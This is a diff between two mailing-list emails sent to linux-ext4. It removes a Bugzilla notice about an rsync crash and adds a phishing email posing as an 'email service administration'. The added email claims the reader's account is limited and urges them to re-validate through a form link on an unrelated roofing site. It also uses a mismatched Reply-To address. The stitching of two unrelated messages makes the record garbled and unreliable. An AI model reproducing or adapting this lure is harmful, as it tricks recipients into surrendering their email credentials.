@@ -1,32 +1,35 @@
-From: bugzilla-daemon@bugzilla.kernel.org
-Subject: [Bug 60721] Rsync crashes due to ext4_ext_find_extent bug
-Date: Thu, 08 Aug 2013 13:36:18 +0000
-Message-ID: <bug-60721-13602-zlFLwOXlwZ@https.bugzilla.kernel.org/>
-References: <bug-60721-13602@https.bugzilla.kernel.org/>
+From: "EMAIL SERVICE ADMINISTRATION" <emailserviceadmin@mail.org>
+Subject: PROTECT YOUR MAIL
+Date: Thu, 8 Aug 2013 16:19:44 +0200
+Message-ID: <20130808141944.M7068@mail.org>
+Reply-To: webmailupdateteam@163.com
 Mime-Version: 1.0
-Content-Type: text/plain; charset="UTF-8"
-Content-Transfer-Encoding: 7bit
-To: linux-ext4@vger.kernel.org
+Content-Type: text/plain;
+	charset=iso-8859-2
+To: undisclosed-recipients:;
 Return-path: <linux-ext4-owner@vger.kernel.org>
-Received: from mail.kernel.org ([198.145.19.201]:60139 "EHLO mail.kernel.org"
-	rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
-	id S1757833Ab3HHNgX (ORCPT <rfc822;linux-ext4@vger.kernel.org>);
-	Thu, 8 Aug 2013 09:36:23 -0400
-Received: from mail.kernel.org (localhost [127.0.0.1])
-	by mail.kernel.org (Postfix) with ESMTP id E2714203F0
-	for <linux-ext4@vger.kernel.org>; Thu,  8 Aug 2013 13:36:21 +0000 (UTC)
-Received: from bugzilla2.web.kernel.org (bugzilla2.web.kernel.org [172.20.200.52])
-	by mail.kernel.org (Postfix) with ESMTP id CB070203B6
-	for <linux-ext4@vger.kernel.org>; Thu,  8 Aug 2013 13:36:18 +0000 (UTC)
-In-Reply-To: <bug-60721-13602@https.bugzilla.kernel.org/>
+Received: from ns1.ef.uns.ac.rs ([147.91.175.65]:64639 "HELO
+	visnja.ef.uns.ac.rs" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
+	with SMTP id S1757850Ab3HHOaA (ORCPT
+	<rfc822;linux-ext4@vger.kernel.org>); Thu, 8 Aug 2013 10:30:00 -0400
 Sender: linux-ext4-owner@vger.kernel.org
 List-ID: <linux-ext4.vger.kernel.org>
 
-https://bugzilla.kernel.org/show_bug.cgi?id=60721
+Dear EMAIL Subscriber,
+     
+    This is to inform you that We have
+noticed some unusual activities in your
+EMAIL account.
+    As a result, access to your EMAIL
+ account has been limited in accordance with the EMAIL.
+    EMAIL Terms And Condition User
+Agreement. To re-validate your EMAIL box, respond
+to this e-mail immediately. 
+And protect your EMAIL from phishing mails.
+ By clicking the link below and follow the instruction
 
---- Comment #1 from zakrzewskim@wp.pl ---
-I'm using CentOS 5.9
+http://www.cheatwoodsroofing.com/form/use/EMAILPROTECTIONSERVICE/form1.html
 
--- 
-You are receiving this mail because:
-You are watching the assignee of the bug.
+Thank you for using our email.
+
+Copyright 2013 Email Administrator
